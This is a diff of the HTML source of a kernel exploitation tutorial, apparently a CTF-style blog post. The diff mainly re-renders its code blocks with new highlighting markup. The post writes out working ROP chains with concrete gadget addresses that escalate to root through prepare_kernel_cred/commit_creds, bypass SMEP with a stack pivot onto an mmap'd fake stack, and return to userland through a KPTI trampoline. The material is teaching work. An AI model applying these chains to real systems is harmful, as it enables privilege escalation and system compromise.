-</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">mov_rdi_rax_jne_pop2_ret</span><span class="p">;</span> <span class="c1">// rdi &lt;- rax
-</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// dummy rbx
-</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// dummy rbp
-</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">commit_creds</span><span class="p">;</span> <span class="c1">// commit_creds(prepare_kernel_cred(0))
-</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">swapgs_pop1_ret</span><span class="p">;</span> <span class="c1">// swapgs
-</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// dummy rbp
-</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">iretq</span><span class="p">;</span> <span class="c1">// iretq frame
-</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_rip</span><span class="p">;</span>
-    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_cs</span><span class="p">;</span>
-    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_rflags</span><span class="p">;</span>
-    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_sp</span><span class="p">;</span>
-    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_ss</span><span class="p">;</span>
-
-    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[*] Prepared payload&#34;</span><span class="p">);</span>
-    <span class="n">ssize_t</span> <span class="n">w</span> <span class="o">=</span> <span class="n">write</span><span class="p">(</span><span class="n">global_fd</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">payload</span><span class="p">));</span>
-
-    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[!] Should never be reached&#34;</span><span class="p">);</span>
-<span class="p">}</span>
-</code></pre></div><p>And with that, we have successfully built an exploitation that bypasses <code>SMEP</code> and opens a root shell in the <em>first scenario</em>. Let&rsquo;s move on to see what difficulty we might face in the second one.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">pop_rdx_ret</span> <span class="o">=</span> <span class="mh">0xffffffff81007616</span><span class="p">;</span> <span class="c1">// pop rdx ; ret
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">cmp_rdx_jne_pop2_ret</span> <span class="o">=</span> <span class="mh">0xffffffff81964cc4</span><span class="p">;</span> <span class="c1">// cmp rdx, 8 ; jne 0xffffffff81964cbb ; pop rbx ; pop rbp ; ret
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">mov_rdi_rax_jne_pop2_ret</span> <span class="o">=</span> <span class="mh">0xffffffff8166fea3</span><span class="p">;</span> <span class="c1">// mov rdi, rax ; jne 0xffffffff8166fe7a ; pop rbx ; pop rbp ; ret
+</span></span></span></code></pre></div><p>The goal with these 3 gadgets is to move <code>rax</code> into <code>rdi</code> without taking the <code>jne</code>. So I have to pop the value 8 into <code>rdx</code>, then return to a <code>cmp</code> instruction to make the comparison equals, which will make sure that we won&rsquo;t jump to <code>jne</code> branch:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="p">...</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">pop_rdx_ret</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x8</span><span class="p">;</span> <span class="c1">// rdx &lt;- 8
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">cmp_rdx_jne_pop2_ret</span><span class="p">;</span> <span class="c1">// make sure JNE doesn&#39;t branch
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// dummy rbx
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// dummy rbp
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">mov_rdi_rax_jne_pop2_ret</span><span class="p">;</span> <span class="c1">// rdi &lt;- rax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// dummy rbx
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// dummy rbp
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">commit_creds</span><span class="p">;</span> <span class="c1">// commit_creds(prepare_kernel_cred(0))
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">...</span>
+</span></span></code></pre></div><p>Secondly, it seems that <code>ROPgadget</code> can find <code>swapgs</code> just fine, but it can&rsquo;t find <code>iretq</code>, so I have to use <code>objdump</code> to look for it:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">objdump -j .text -d ~/vmlinux <span class="p">|</span> grep iretq <span class="p">|</span> head -1
+</span></span><span class="line"><span class="cl">-&gt; ffffffff8100c0d9:       <span class="m">48</span> cf                   iretq  
+</span></span></code></pre></div><p>With the gadgets in hand, we can build the full ROP chain:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">user_rip</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">get_shell</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="mh">0xffffffff81006370</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">pop_rdx_ret</span> <span class="o">=</span> <span class="mh">0xffffffff81007616</span><span class="p">;</span> <span class="c1">// pop rdx ; ret
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">cmp_rdx_jne_pop2_ret</span> <span class="o">=</span> <span class="mh">0xffffffff81964cc4</span><span class="p">;</span> <span class="c1">// cmp rdx, 8 ; jne 0xffffffff81964cbb ; pop rbx ; pop rbp ; ret
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">mov_rdi_rax_jne_pop2_ret</span> <span class="o">=</span> <span class="mh">0xffffffff8166fea3</span><span class="p">;</span> <span class="c1">// mov rdi, rax ; jne 0xffffffff8166fe7a ; pop rbx ; pop rbp ; ret
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">commit_creds</span> <span class="o">=</span> <span class="mh">0xffffffff814c6410</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">prepare_kernel_cred</span> <span class="o">=</span> <span class="mh">0xffffffff814c67f0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">swapgs_pop1_ret</span> <span class="o">=</span> <span class="mh">0xffffffff8100a55f</span><span class="p">;</span> <span class="c1">// swapgs ; pop rbp ; ret
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">iretq</span> <span class="o">=</span> <span class="mh">0xffffffff8100c0d9</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">overflow</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="n">n</span> <span class="o">=</span> <span class="mi">50</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">payload</span><span class="p">[</span><span class="n">n</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="n">off</span> <span class="o">=</span> <span class="mi">16</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">cookie</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// rbx
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// r12
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// rbp
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">pop_rdi_ret</span><span class="p">;</span> <span class="c1">// return address
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// rdi &lt;- 0
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">prepare_kernel_cred</span><span class="p">;</span> <span class="c1">// prepare_kernel_cred(0)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">pop_rdx_ret</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x8</span><span class="p">;</span> <span class="c1">// rdx &lt;- 8
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">cmp_rdx_jne_pop2_ret</span><span class="p">;</span> <span class="c1">// make sure JNE doesn&#39;t branch
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// dummy rbx
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// dummy rbp
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">mov_rdi_rax_jne_pop2_ret</span><span class="p">;</span> <span class="c1">// rdi &lt;- rax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// dummy rbx
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// dummy rbp
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">commit_creds</span><span class="p">;</span> <span class="c1">// commit_creds(prepare_kernel_cred(0))
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">swapgs_pop1_ret</span><span class="p">;</span> <span class="c1">// swapgs
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// dummy rbp
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">iretq</span><span class="p">;</span> <span class="c1">// iretq frame
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_rip</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_cs</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_rflags</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_sp</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_ss</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[*] Prepared payload&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ssize_t</span> <span class="n">w</span> <span class="o">=</span> <span class="n">write</span><span class="p">(</span><span class="n">global_fd</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">payload</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[!] Should never be reached&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>And with that, we have successfully built an exploitation that bypasses <code>SMEP</code> and opens a root shell in the <em>first scenario</em>. Let&rsquo;s move on to see what difficulty we might face in the second one.</p>
 <h3 id="pivoting-the-stack">Pivoting the stack</h3>
 <p>It is clear that we cannot fit the whole ROP chain in the stack anymore with the assumption that we can only overflow up to the return address. To overcome that, we will again use a technique that is also quite popular in userland pwn: <code>stack pivot</code>. It is a technique which involves modifying <code>rsp</code> to point into a controlled writable address, effectively creating a fake stack. However, while pivoting the stack in userland often involves overwriting the <code>saved RBP</code> of a function, then return from it, pivoting in the kernel is much simpler. Because we have such a huge amount of gadgets in the kernel image, we can look for those which modify <code>rsp/esp</code> itself. We are most interested in gadgets that move a constant value into <code>esp</code>, just make sure that the gadget is executable, and the constant value is properly aligned. This is the gadget that I ended up using:</p>
-<div class="highlight"><pre class="chroma"><code class="language-C" data-lang="C"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">mov_esp_pop2_ret</span> <span class="o">=</span> <span class="mh">0xffffffff8196f56a</span><span class="p">;</span> <span class="c1">// mov esp, 0x5b000000 ; pop r12 ; pop rbp ; ret
-</span></code></pre></div><p>So that&rsquo;s what we will overwrite the return address with, but before that, we have to setup our fake stack first. Since <code>esp</code> will become <code>0x5b000000</code> after that, we will map a fixed page there, then start writing our ROP chain into it:</p>
-<div class="highlight"><pre class="chroma"><code class="language-C" data-lang="C"><span class="kt">void</span> <span class="nf">build_fake_stack</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
-    <span class="n">fake_stack</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x5b000000</span> <span class="o">-</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="mh">0x2000</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="o">|</span><span class="n">PROT_WRITE</span><span class="o">|</span><span class="n">PROT_EXEC</span><span class="p">,</span> <span class="n">MAP_ANONYMOUS</span><span class="o">|</span><span class="n">MAP_PRIVATE</span><span class="o">|</span><span class="n">MAP_FIXED</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
-    <span class="kt">unsigned</span> <span class="n">off</span> <span class="o">=</span> <span class="mh">0x1000</span> <span class="o">/</span> <span class="mi">8</span><span class="p">;</span>
-    <span class="n">fake_stack</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xdead</span><span class="p">;</span> <span class="c1">// put something in the first page to prevent fault
-</span><span class="c1"></span>    <span class="n">fake_stack</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// dummy r12
-</span><span class="c1"></span>    <span class="n">fake_stack</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// dummy rbp
-</span><span class="c1"></span>    <span class="n">fake_stack</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">pop_rdi_ret</span><span class="p">;</span>
-    <span class="p">...</span> <span class="c1">// the rest of the chain is the same as the last payload
-</span><span class="c1"></span><span class="p">}</span>
-</code></pre></div><p>There are 2 things that should be noticed in the above code:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">mov_esp_pop2_ret</span> <span class="o">=</span> <span class="mh">0xffffffff8196f56a</span><span class="p">;</span> <span class="c1">// mov esp, 0x5b000000 ; pop r12 ; pop rbp ; ret
+</span></span></span></code></pre></div><div class="details admonition note open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-pencil-alt fa-fw"></i>Note<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><em>Many readers have asked me that why does the <code>mov esp</code> gadget work, even though in kernel space, the higher 4 bytes of <code>rsp</code> is not 0 and <code>esp</code> only affects the lower 4 bytes. The answer to this is documented in the documentation of Intel x86 <a href="http://x86asm.net/articles/x86-64-tour-of-intel-manuals/#General-purpose-Registers" target="_blank" rel="noopener noreffer">here</a>. TL;DR: by design, a mov instruction that has a 32-bit register as the destination in x86-64 actually zeroes the upper 32 bits of the whole 64-bit register.</em></div>
+        </div>
+    </div>
+<p>So that&rsquo;s what we will overwrite the return address with, but before that, we have to setup our fake stack first. Since <code>esp</code> will become <code>0x5b000000</code> after that, we will map a fixed page there, then start writing our ROP chain into it:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">build_fake_stack</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="n">fake_stack</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x5b000000</span> <span class="o">-</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="mh">0x2000</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="o">|</span><span class="n">PROT_WRITE</span><span class="o">|</span><span class="n">PROT_EXEC</span><span class="p">,</span> <span class="n">MAP_ANONYMOUS</span><span class="o">|</span><span class="n">MAP_PRIVATE</span><span class="o">|</span><span class="n">MAP_FIXED</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="n">off</span> <span class="o">=</span> <span class="mh">0x1000</span> <span class="o">/</span> <span class="mi">8</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">fake_stack</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xdead</span><span class="p">;</span> <span class="c1">// put something in the first page to prevent fault
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">fake_stack</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// dummy r12
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">fake_stack</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// dummy rbp
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">fake_stack</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">pop_rdi_ret</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">...</span> <span class="c1">// the rest of the chain is the same as the last payload
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
+</span></span></code></pre></div><p>There are 2 things that should be noticed in the above code:</p>
 <ol>
 <li>I mmapped the pages at <code>0x5b000000 - 0x1000</code> instead of exactly <code>0x5b000000</code>. This is because functions like <code>prepare_kernel_cred()</code> and <code>commit_creds()</code> make calls to other functions inside them, causing the stack to grow. If we point our <code>esp</code> at the exact start of the page, there will not be enough space for the stack to grow and it will crash.</li>
 <li>I must write a dummy value into the first page, otherwise it will create a <code>Double Fault</code>. According to my understanding, the reason being the pages are only inserted to the page table after being accessed, not after being mapped. We mapped <code>0x2000</code> bytes which equal to 2 pages, and we put our ROP chain entirely in the second page, so we have to access the first page as well.</li>
@@ -331,70 +339,70 @@
 </ol>
 <h3 id="tweaking-the-rop-chain">Tweaking the ROP chain</h3>
 <p>The piece of code resides in a function called <code>swapgs_restore_regs_and_return_to_usermode()</code>, we can again find the address of it by reading <code>/proc/kallsyms</code>:</p>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">cat /proc/kallsyms <span class="p">|</span> grep swapgs_restore_regs_and_return_to_usermode
--&gt; ffffffff81200f10 T swapgs_restore_regs_and_return_to_usermode
-</code></pre></div><p>This is what the start of the function looks like in IDA:</p>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">.text:FFFFFFFF81200F10                 pop     r15
-.text:FFFFFFFF81200F12                 pop     r14
-.text:FFFFFFFF81200F14                 pop     r13
-.text:FFFFFFFF81200F16                 pop     r12
-.text:FFFFFFFF81200F18                 pop     rbp
-.text:FFFFFFFF81200F19                 pop     rbx
-.text:FFFFFFFF81200F1A                 pop     r11
-.text:FFFFFFFF81200F1C                 pop     r10
-.text:FFFFFFFF81200F1E                 pop     r9
-.text:FFFFFFFF81200F20                 pop     r8
-.text:FFFFFFFF81200F22                 pop     rax
-.text:FFFFFFFF81200F23                 pop     rcx
-.text:FFFFFFFF81200F24                 pop     rdx
-.text:FFFFFFFF81200F25                 pop     rsi
-.text:FFFFFFFF81200F26                 mov     rdi, rsp
-.text:FFFFFFFF81200F29                 mov     rsp, qword ptr gs:unk_6004
-.text:FFFFFFFF81200F32                 push    qword ptr <span class="o">[</span>rdi+30h<span class="o">]</span>
-.text:FFFFFFFF81200F35                 push    qword ptr <span class="o">[</span>rdi+28h<span class="o">]</span>
-.text:FFFFFFFF81200F38                 push    qword ptr <span class="o">[</span>rdi+20h<span class="o">]</span>
-.text:FFFFFFFF81200F3B                 push    qword ptr <span class="o">[</span>rdi+18h<span class="o">]</span>
-.text:FFFFFFFF81200F3E                 push    qword ptr <span class="o">[</span>rdi+10h<span class="o">]</span>
-.text:FFFFFFFF81200F41                 push    qword ptr <span class="o">[</span>rdi<span class="o">]</span>
-.text:FFFFFFFF81200F43                 push    rax
-.text:FFFFFFFF81200F44                 jmp     short loc_FFFFFFFF81200F89
-...
-</code></pre></div><p>As you can see, it first recovers a lot of registers by popping from the stack. However, what we are actually interested in is the parts where it swaps the page tables, <code>swapgs</code> and <code>iretq</code>, and not this part. Simply ROP into the start of this function works fine, but it will unnecessarily enlarge our ROP chain due to a lot of dummy registers need to be inserted. As a result, our <code>KPTI trampoline</code> will be at <code>swapgs_restore_regs_and_return_to_usermode + 22</code> instead, which is the address of the first <code>mov</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat /proc/kallsyms <span class="p">|</span> grep swapgs_restore_regs_and_return_to_usermode
+</span></span><span class="line"><span class="cl">-&gt; ffffffff81200f10 T swapgs_restore_regs_and_return_to_usermode
+</span></span></code></pre></div><p>This is what the start of the function looks like in IDA:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">.text:FFFFFFFF81200F10                 pop     r15
+</span></span><span class="line"><span class="cl">.text:FFFFFFFF81200F12                 pop     r14
+</span></span><span class="line"><span class="cl">.text:FFFFFFFF81200F14                 pop     r13
+</span></span><span class="line"><span class="cl">.text:FFFFFFFF81200F16                 pop     r12
+</span></span><span class="line"><span class="cl">.text:FFFFFFFF81200F18                 pop     rbp
+</span></span><span class="line"><span class="cl">.text:FFFFFFFF81200F19                 pop     rbx
+</span></span><span class="line"><span class="cl">.text:FFFFFFFF81200F1A                 pop     r11
+</span></span><span class="line"><span class="cl">.text:FFFFFFFF81200F1C                 pop     r10
+</span></span><span class="line"><span class="cl">.text:FFFFFFFF81200F1E                 pop     r9
+</span></span><span class="line"><span class="cl">.text:FFFFFFFF81200F20                 pop     r8
+</span></span><span class="line"><span class="cl">.text:FFFFFFFF81200F22                 pop     rax
+</span></span><span class="line"><span class="cl">.text:FFFFFFFF81200F23                 pop     rcx
+</span></span><span class="line"><span class="cl">.text:FFFFFFFF81200F24                 pop     rdx
+</span></span><span class="line"><span class="cl">.text:FFFFFFFF81200F25                 pop     rsi
+</span></span><span class="line"><span class="cl">.text:FFFFFFFF81200F26                 mov     rdi, rsp
+</span></span><span class="line"><span class="cl">.text:FFFFFFFF81200F29                 mov     rsp, qword ptr gs:unk_6004
+</span></span><span class="line"><span class="cl">.text:FFFFFFFF81200F32                 push    qword ptr <span class="o">[</span>rdi+30h<span class="o">]</span>
+</span></span><span class="line"><span class="cl">.text:FFFFFFFF81200F35                 push    qword ptr <span class="o">[</span>rdi+28h<span class="o">]</span>
+</span></span><span class="line"><span class="cl">.text:FFFFFFFF81200F38                 push    qword ptr <span class="o">[</span>rdi+20h<span class="o">]</span>
+</span></span><span class="line"><span class="cl">.text:FFFFFFFF81200F3B                 push    qword ptr <span class="o">[</span>rdi+18h<span class="o">]</span>
+</span></span><span class="line"><span class="cl">.text:FFFFFFFF81200F3E                 push    qword ptr <span class="o">[</span>rdi+10h<span class="o">]</span>
